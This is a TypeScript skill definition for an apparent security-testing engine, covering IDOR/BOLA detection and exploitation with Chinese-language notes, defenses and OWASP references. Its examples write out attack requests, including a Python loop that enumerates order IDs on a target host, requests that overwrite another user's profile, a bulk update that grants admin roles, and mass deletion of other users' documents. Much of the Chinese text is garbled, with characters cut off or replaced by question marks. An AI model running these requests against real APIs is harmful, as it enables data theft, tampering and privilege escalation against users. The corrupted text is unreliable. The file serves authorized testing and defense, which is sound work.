/**
 * HOS-Sec-Engine V2 - IDOR Detection Skills
 * IDOR（不安全的直接对象引用）检测与利用专项 Skill 集合
 */

import { AttackDefenseSkill } from '\.\./\.\./\.\./types/skill';

export const idorDetectionSkills: AttackDefenseSkill[] = [
    {
        metadata: {
            id: 'api-idor-001',
            name: 'IDOR Detection and Exploitation',
            category: 'api',
            subCategory: 'idor',
            riskLevel: 'high',
            confidence: 0.90,
            updatedAt: '2026-06',
            author: 'HOS-Sec-Engine',
            tags: ['idor', 'access-control', 'bola', 'authorization', 'parameter-tampering', 'enumeration', 'privilege-escalation'],
        },
        trigger: {
            scenarios: [
                'API 端点使用数字 ID、UUID/GUID 或用户名作为对象引用参数',
                'URL 路径包含资源标识符：/api/users/123/orders?api/documents?id=456',
                '请求参数中包含当前用户的 ID 或其他用户可推测的标识符',
                '批量操作 API 支持传入多个资源 ID',
                'GraphQL 查询中通过 ID 参数获取对象',
                'API 响应中包含其他用户的资源 ID 或敏感数',
                '分页 API 返回大量资源列表，可通过遍历获取未授权数?',
            ],
            keywords: [
                'idor',
                'insecure direct object reference',
                'bola',
                'broken object level authorization',
                'parameter tampering',
                'id enumeration',
                'sequential id',
                'uuid',
                'guid',
                'object reference',
                'access control bypass',
                'horizontal privilege escalation',
                'vertical privilege escalation',
                '越权访问',
                '水平越权',
                '垂直越权',
                'id 遍历',
            ],
            aliases: [
                'bola',
                'broken object level authorization',
                'direct object reference',
                'id 篡改',
                '参数越权',
                '对象级授权失',
                'api 越权',
                '资源访问越权',
            ],
            indicators: [
                '200 OK',
                'user_id',
                'id=',
                '/api/users/',
                '/api/orders/',
                '/api/documents/',
                '/api/profile',
                'owner_id',
                'account_id',
                'resource_id',
            ],
        },
        knowledge: {
            description: 'IDOR (Insecure Direct Object Reference)，OWASP API Security Top 10 中称?BOLA (Broken Object Level Authorization)，是最常见?API 安全漏洞之一。当 API 端点使用用户可控的标识符（数?ID、UUID、用户名等）直接引用后端对象，且未在每次请求时验证当前用户是否有权访问该对象时，攻击者可通过修改标识符访问其他用户的资源。IDOR 危害极大，可导致数据泄露、数据篡改和权限提升，且自动化检测困难，需要深入理解业务逻辑',
            symptoms: [
                '修改 URL 中的用户 ID（如 /api/users/100 ?/api/users/101）返回其他用户数',
                '修改请求体中?owner_id ?account_id 后操作成功应用于其他用户资源',
                '通过枚举 ID 获取到其他用户的订单、文档、个人资料等敏感信息',
                'GraphQL 查询中传入其他用户的 ID 成功获取其数',
                '分页 API 中可遍历获取不属于当前用户的资源列表',
                '修改间接引用映射（如 /api/docs/abc123 ?/api/docs/def456）访问他人资',
                'API 响应中包含其他用?ID，使用这?ID 进一步请求成?',
            ],
            rootCauses: [
                'API 端点仅验证用户是否已认证（token 有效），未验证用户是否有权访问特定资',
                '开发者假设用户不会修?URL 参数或使用难以猜测的 UUID，忽视授权检',
                '对象所有权关系未在数据库查询中体现（缺?WHERE owner_id = ? 条件',
                '间接引用映射（间?ID）未在服务端验证映射关系',
                'GraphQL schema 未实施字段级和对象级权限控制',
                '批量 API 未逐个验证每个资源 ID 的访问权',
                '微服务架构中，认证和授权分离，授权检查被遗漏',
                'API 版本迭代时新端点未继承原有权限检查逻辑',
            ],
            observations: [
                'IDOR ?OWASP API Security Top 10 连续多年?#1 漏洞，占比超?30%',
                '数字 ID ?IDOR 最容易发现和利用，UUID/GUID 仅增加了发现难度而非阻止利用',
                'GraphQL IDOR 常被忽视，因为传统安全工具对 GraphQL 支持不足',
                '移动?API ?IDOR 更常见，因为开发者假设客户端不会修改请求参数',
                '批量操作 API（如 /api/users/bulk-delete）中?IDOR 危害更大，可导致大规模数据泄',
                '间接引用（如短链接、哈?ID）如果映射表未做权限校验，同样存?IDOR',
                '很多系统?GET 请求做了权限检查但遗漏?PUT/PATCH/DELETE',
                'SaaS 多租户架构中的跨租户 IDOR 是最严重的变体，可跨组织访问数据',
            ],
            commonMistakes: [
                '认为 UUID/GUID 不可猜测就能替代授权检查（UUID 可通过其他方式泄露',
                '只在创建资源时检查权限，不在读取/更新/删除时检',
                '前端隐藏 ID 就认为安全（攻击者通过代理工具可直接修改请求）',
                '使用间接引用（如 base64 编码 ID）但未在服务端验证权',
                '只检查用户是否登录，不检查用户是否有权访问该资源',
                '在列表接口做了权限过滤，但在详情接口遗漏',
                'GraphQL 查询中允许任?ID 过滤但未验证访问权限',
                '批量 API 只验证第一个资?ID 的权限，忽略其余',
            ],
            notes: [
                'IDOR 难以自动化检测，需要结合业务逻辑理解什么是"越权"',
                'Burp Suite ?AuthMatrix ?Autorize 插件可辅助检?IDOR',
                'OWASP API Security Top 10 2023 ?BOLA 列为 API1:2023',
                'GDPR、CCPA 等数据保护法规下，IDOR 导致的数据泄露可触发合规处罚',
                '测试 IDOR 需要至少两个不同权限级别的账户（A ?B），?A ?token 访问 B 的资?',
            ],
        },
        action: {
            checklist: [
                '注册两个不同用户账户（User A ?User B），获取各自的认?token',
                '使用 User A ?token 访问资源，记录所有包?ID 参数的请',
                '将请求中?ID 替换?User B 的资?ID，使?User A ?token 发送请',
                '检查响应是否返?User B 的数据（水平越权',
                '?PUT/PATCH/DELETE 请求重复上述测试（常被遗漏）',
                '尝试 ID 枚举：递增/递减 ID 值，观察是否返回不同用户数据',
                '测试间接引用：修改短链接、哈?ID、base64 编码 ID',
                '检?GraphQL 查询：传入其他用?ID，观察是否返回数',
                '测试批量 API：在 ID 列表中加入不属于自己的资?ID',
                '测试分页 API：通过遍历所有页获取不属于当前用户的资源',
                '检查响应中的信息泄露：其他用户 ID、内部路径、调试信',
                '验证多租户场景：尝试跨组?租户访问资源',
            ],
            techniques: [
                '顺序 ID 枚举：id=100, 101, 102... 遍历相邻资源',
                'UUID/GUID 枚举：从公开接口或响应中收集 UUID，交叉访',
                '参数篡改：修改请求体/查询参数中的 owner_id、account_id、user_id',
                'HTTP 方法变更：GET 有权限检查但 POST/PUT/DELETE 没有',
                '间接引用映射绕过：解?重编码间?ID，访问映射对',
                'GraphQL ID 注入：在查询中替?ID 字段为其他用户资?ID',
                '批量 IDOR：在数组参数中添加他人资?ID',
                '多租户越权：修改 tenant_id ?organization_id 跨租户访?',
            ],
            examples: [
                {
                    name: '顺序 ID 枚举获取他人订单',
                    description: '通过递增订单 ID 遍历获取其他用户的订单详',
                    content: "请求示例 (User A 查看自己的订?:\n" +
                        "GET /api/v1/orders/1001\n" +
                        "Authorization: Bearer <UserA_Token>\n\n" +
                        "响应 (200 OK):\n" +
                        '{\n' +
                        '  "id": 1001,\n' +
                        '  "user_id": "user_a_123",\n' +
                        '  "items": [{"product": "MacBook Pro", "price": 1999}],\n' +
                        '  "shipping_address": "123 Main St",\n' +
                        '  "total": 1999,\n' +
                        '  "status": "shipped"\n' +
                        '}\n\n' +
                        "攻击: 修改订单 ID ?1002\n" +
                        "GET /api/v1/orders/1002\n" +
                        "Authorization: Bearer <UserA_Token>\n\n" +
                        "响应 (200 OK - IDOR 漏洞):\n" +
                        '{\n' +
                        '  "id": 1002,\n' +
                        '  "user_id": "user_b_456",\n' +
                        '  "items": [{"product": "iPhone 15", "price": 999}],\n' +
                        '  "shipping_address": "456 Oak Ave",\n' +
                        '  "total": 999,\n' +
                        '  "status": "processing"\n' +
                        '}\n\n' +
                        "自动化枚?(Python):\n" +
                        "import requests\n" +
                        "token = '<UserA_Token>'\n" +
                        "headers = {'Authorization': f'Bearer {token}'}\n" +
                        "for order_id in range(1000, 2000):\n" +
                        '    r = requests.get(f"https://target.com/api/v1/orders/{order_id}", headers=headers)\n' +
                        '    if r.status_code == 200:\n' +
                        '        data = r.json()\n' +
                        '        print(f"Order {order_id}: user={data.get(\'user_id\')}, total={data.get(\'total\')}")\n',
                },
                {
                    name: 'UUID/GUID 交叉访问',
                    description: '利用从公开接口获取?UUID 访问其他用户的资',
                    content: "步骤 1: 从公开接口获取 UUID\n" +
                        "GET /api/v1/products/reviews?product_id=prod_001\n" +
                        "响应中包?\n" +
                        '{\n' +
                        '  "reviews": [\n' +
                        '    {"id": "review_a1b2c3d4-e5f6-7890-abcd-ef1234567890", "user_id": "user_xxx", "text": "Great!"},\n' +
                        '    {"id": "review_b2c3d4e5-f6a7-8901-bcde-f12345678901", "user_id": "user_yyy", "text": "Nice!"}\n' +
                        '  ]\n' +
                        '}\n\n' +
                        "步骤 2: 使用 User A ?token 访问 User B ?review 详情\n" +
                        "GET /api/v1/reviews/review_b2c3d4e5-f6a7-8901-bcde-f12345678901\n" +
                        "Authorization: Bearer <UserA_Token>\n\n" +
                        "响应 (200 OK - IDOR 漏洞):\n" +
                        '{\n' +
                        '  "id": "review_b2c3d4e5-f6a7-8901-bcde-f12345678901",\n' +
                        '  "user_id": "user_yyy",\n' +
                        '  "text": "Nice!",\n' +
                        '  "email": "yyy@example.com",\n' +
                        '  "phone": "+1-555-0102",\n' +
                        '  "ip_address": "192.168.1.100"\n' +
                        '}\n\n' +
                        "步骤 3: 尝试修改或删除他?review\n" +
                        "PUT /api/v1/reviews/review_b2c3d4e5-f6a7-8901-bcde-f12345678901\n" +
                        "Authorization: Bearer <UserA_Token>\n" +
                        'Content-Type: application/json\n' +
                        '{"text": "Hacked!"}\n\n' +
                        "原理: UUID 虽然不可顺序枚举，但可从公开接口、响应头、错误消息等渠道获取\n" +
                        "     获取后交叉访问即可测?IDOR",
                },
                {
                    name: '请求体参数篡?(owner_id/account_id)',
                    description: '修改 POST/PUT 请求体中的资源归属参数，操作他人资源',
                    content: "场景: 用户更新个人资料\n" +
                        "正常请求:\n" +
                        "PUT /api/v1/profile\n" +
                        "Authorization: Bearer <UserA_Token>\n" +
                        'Content-Type: application/json\n' +
                        '{\n' +
                        '  "user_id": "user_a_123",\n' +
                        '  "display_name": "User A",\n' +
                        '  "email": "usera@example.com"\n' +
                        '}\n\n' +
                        "攻击: 修改 user_id 为他?ID\n" +
                        "PUT /api/v1/profile\n" +
                        "Authorization: Bearer <UserA_Token>\n" +
                        'Content-Type: application/json\n' +
                        '{\n' +
                        '  "user_id": "user_b_456",\n' +
                        '  "display_name": "Hacked by A",\n' +
                        '  "email": "attacker@example.com"\n' +
                        '}\n\n' +
                        "响应 (200 OK - IDOR 漏洞):\n" +
                        '{\n' +
                        '  "message": "Profile updated successfully",\n' +
                        '  "user_id": "user_b_456"\n' +
                        '}\n\n' +
                        "变体参数?\n" +
                        '  - owner_id, owner, created_by\n' +
                        '  - account_id, account, org_id, organization_id\n' +
                        '  - user_id, user, uid\n' +
                        '  - customer_id, client_id, member_id\n' +
                        '  - project_id, team_id, group_id\n\n' +
                        "原理: 很多 API 从请求体中读取资源ID进行数据库操作\n" +
                        "     如果未将请求体ID与token中的用户ID进行比对，即可篡改",
                },
                {
                    name: 'GraphQL IDOR 利用',
                    description: '?GraphQL 查询中替换对?ID 获取他人数据',
                    content: "正常查询 (User A 查看自己的信?:\n" +
                        "POST /graphql\n" +
                        "Authorization: Bearer <UserA_Token>\n" +
                        'Content-Type: application/json\n\n' +
                        '{\n' +
                        '  "query": "query { user(id: \\"user_a_123\\") { id name email phone address orders { id total status } } }"\n' +
                        '}\n\n' +
                        "攻击查询 (User A 尝试访问 User B):\n" +
                        '{\n' +
                        '  "query": "query { user(id: \\"user_b_456\\") { id name email phone address orders { id total status } } }"\n' +
                        '}\n\n' +
                        "响应 (200 OK - GraphQL IDOR 漏洞):\n" +
                        '{\n' +
                        '  "data": {\n' +
                        '    "user": {\n' +
                        '      "id": "user_b_456",\n' +
                        '      "name": "User B",\n' +
                        '      "email": "userb@example.com",\n' +
                        '      "phone": "+1-555-0200",\n' +
                        '      "address": "456 Oak Ave",\n' +
                        '      "orders": [\n' +
                        '        {"id": "ord_789", "total": 2999, "status": "delivered"},\n' +
                        '        {"id": "ord_790", "total": 499, "status": "pending"}\n' +
                        '      ]\n' +
                        '    }\n' +
                        '  }\n' +
                        '}\n\n' +
                        "批量枚举 (遍历用户):\n" +
                        '{\n' +
                        '  "query": "query { users(first: 100, after: null) { edges { node { id name email } } pageInfo { hasNextPage endCursor } } }"\n' +
                        '}\n\n' +
                        "原理: GraphQL 允许通过 ID 参数直接查询对象\n" +
                        "     如果 resolver 未检查当前用户是否有权访问目标对象，即存在IDOR\n" +
                        "     GraphQL 的内省功能还可帮助攻击者发现所有可用的字段和查询",
                },
                {
                    name: '批量操作中的 Mass IDOR',
                    description: '在批?API 中添加他人资?ID 实现批量越权操作',
                    content: "正常请求 (删除自己的文?:\n" +
                        "POST /api/v1/documents/bulk-delete\n" +
                        "Authorization: Bearer <UserA_Token>\n" +
                        'Content-Type: application/json\n' +
                        '{\n' +
                        '  "document_ids": ["doc_a1", "doc_a2", "doc_a3"]\n' +
                        '}\n\n' +
                        "攻击: ?ID 列表中添加他人文档\n" +
                        '{\n' +
                        '  "document_ids": ["doc_a1", "doc_a2", "doc_b1", "doc_b2", "doc_admin_1"]\n' +
                        '}\n\n' +
                        "响应 (200 OK - Mass IDOR 漏洞):\n" +
                        '{\n' +
                        '  "deleted": ["doc_a1", "doc_a2", "doc_b1", "doc_b2", "doc_admin_1"],\n' +
                        '  "failed": []\n' +
                        '}\n\n' +
                        "批量更新攻击:\n" +
                        "PUT /api/v1/users/bulk-update\n" +
                        "Authorization: Bearer <UserA_Token>\n" +
                        '{\n' +
                        '  "user_ids": ["user_a_123", "user_b_456", "user_admin_001"],\n' +
                        '  "updates": {"role": "admin", "status": "active"}\n' +
                        '}\n\n' +
                        "分页遍历攻击:\n" +
                        "GET /api/v1/admin/users?page=1&limit=100\n" +
                        "Authorization: Bearer <UserA_Token>  // 普通用?token\n" +
                        "?如果分页接口未做权限过滤，可遍历获取所有用户数据\n\n" +
                        "原理: 批量 API 通常循环处理 ID 列表，如果未在循环中逐个验证权限\n" +
                        "     攻击者可在列表中加入任意 ID 进行批量越权操作\n" +
                        "     危害远大于单个IDOR，一次请求即可影响大量资源",
                },
                {
                    name: '间接引用映射 (Indirect Reference) 绕过',
                    description: '间接 ID 映射未做权限校验，导致映射关系可被操',
                    content: "场景: 使用间接引用（短哈希 ID）替代直接数据库 ID\n" +
                        "正常请求:\n" +
                        "GET /api/v1/files/abc123xyz\n" +
                        "Authorization: Bearer <UserA_Token>\n" +
                        "?abc123xyz 映射到数据库 file_id = 1001 (属于 User A)\n\n" +
                        "攻击 1: 枚举间接 ID\n" +
                        "GET /api/v1/files/abc123xya\n" +
                        "GET /api/v1/files/abc123xyb\n" +
                        "GET /api/v1/files/abc123xyc\n" +
                        "?如果间接 ID 生成规则可推测（?base64 编码），可枚举获取他人文件\n\n" +
                        "攻击 2: 从公开来源收集间接 ID\n" +
                        "- 从分享链接、邮件通知、API 响应中获取他人的间接 ID\n" +
                        "- 使用这些 ID 访问对应资源\n" +
                        "GET /api/v1/files/def456uvw  // User B 的文件间?ID\n" +
                        "Authorization: Bearer <UserA_Token>\n\n" +
                        "攻击 3: 解码间接 ID\n" +
                        "如果间接 ID ?base64 编码的数据库 ID:\n" +
                        "echo 'MTAwMQ==' | base64 -d  // 输出: 1001\n" +
                        "echo 'MTAwMg==' | base64 -d  // 输出: 1002\n" +
                        "?解码后可直接获取数据?ID 并篡改\n\n" +
                        "原理: 间接引用旨在增加 ID 不可预测性，但如果映射层未做权限校验\n" +
                        "     或间接ID生成规则可推测，则保护无效",
                },
                {
                    name: 'HTTP 方法变更 IDOR',
                    description: 'GET 请求有权限检查但 POST/PUT/DELETE 遗漏',
                    content: "测试场景: 订单管理 API\n\n" +
                        "GET /api/v1/orders/1002  (User A token)\n" +
                        "?403 Forbidden (权限检查正?\n\n" +
                        "PUT /api/v1/orders/1002  (User A token)\n" +
                        '{ "status": "cancelled" }\n' +
                        "?200 OK (IDOR 漏洞！成功取消他人订?\n\n" +
                        "DELETE /api/v1/orders/1002  (User A token)\n" +
                        "?200 OK (IDOR 漏洞！成功删除他人订?\n\n" +
                        "PATCH /api/v1/orders/1002/items  (User A token)\n" +
                        '{ "quantity": 0 }\n' +
                        "?200 OK (IDOR 漏洞！成功修改他人订单项)\n\n" +
                        "原理: 开发团队可能在 GET 端点实现了权限检查（因为数据可见性更受关注）\n" +
                        "     但遗漏了写操作（PUT/PATCH/DELETE）的权限检查\n" +
                        "     这是最常见?IDOR 变体之一\n\n" +
                        "测试策略:\n" +
                        "1. 对每个资源端点测试所?HTTP 方法\n" +
                        "2. 用低权限用户?token 尝试高权限操作\n" +
                        "3. 重点测试写操作（创建、更新、删除）",
                },
            ],
        },
        validation: {
            indicators: [
                '使用 User A ?token 访问 User B 的资?ID 返回 200 和有效数',
                '修改请求参数中的资源 ID 后成功获取或修改他人数据',
                '批量操作中成功处理了不属于自己的资源 ID',
                'GraphQL 查询返回其他用户的敏感信',
                '分页 API 遍历返回不属于当前用户的资源',
            ],
            successSigns: [
                '响应中包含其他用户的个人数据（姓名、邮箱、地址等）',
                '成功修改或删除其他用户的资源',
                '响应?user_id/owner_id ?token 中的用户 ID 不一',
                '批量操作返回的成功列表中包含他人资源 ID',
                'GraphQL 查询中传入他?ID 返回完整数据对象',
            ],
            falsePositiveSigns: [
                '返回 403/401 说明权限检查正常生',
                '返回 200 但数据是当前用户的（ID 不存在时回退到默认用户）',
                '返回空对象或 null（资源不存在而非权限通过',
                '返回 404（正确实现应返回 403 以避?ID 枚举，但 404 也表明未越权',
                '响应中数据是公开的（如公开评论、公开资料），非真正越?',
            ],
        },
        defense: {
            recommendations: [
                '在每?API 请求中验证当前用户是否有权访问目标资源，而非仅验证是否已认证',
                '使用基于角色的访问控?(RBAC) 或基于属性的访问控制 (ABAC) 框架',
                '数据库查询中强制包含所有权条件：WHERE resource_id = ? AND owner_id = ?',
                '不要在请求体中接受用?ID 作为资源标识符，?token 中提',
                'GraphQL resolver 中实施对象级和字段级权限检',
                '批量 API 中逐个验证每个资源 ID 的访问权',
                '间接引用映射中在服务端验证映射关系和权限',
                '使用 UUID/GUID 替代顺序 ID 增加枚举难度（但不能替代权限检查）',
                '实施最小权限原则，用户只能访问完成业务所需的最小资源集',
                '记录所有资源访问日志，包含用户 ID、资?ID、操作类型，便于审计和检测异?',
            ],
            mitigations: [
                '使用统一的授权中间件/装饰器，确保所有端点都经过权限检',
                '实施 API 安全网关，集中处理认证和授权',
                '定期审查 API 端点的权限实现，尤其是新增端',
                '使用自动?IDOR 检测工具（?Burp Autorize、Postman 测试脚本',
                '在多租户架构中实施租户隔离，确保查询始终包含 tenant_id 过滤',
                '对敏感操作实施二次验证（如删除操作需要密码确认）',
            ],
            references: [
                'https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/',
                'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References',
                'https://portswigger.net/web-security/access-control/idor',
                'https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html',
                'https://cwe.mitre.org/data/definitions/639.html',
            ],
        },
        quality: {
            confidence: 0.90,
            reviewed: true,
            tested: true,
            lastVerified: '2026-06',
        },
        enabled: true,
    },
];
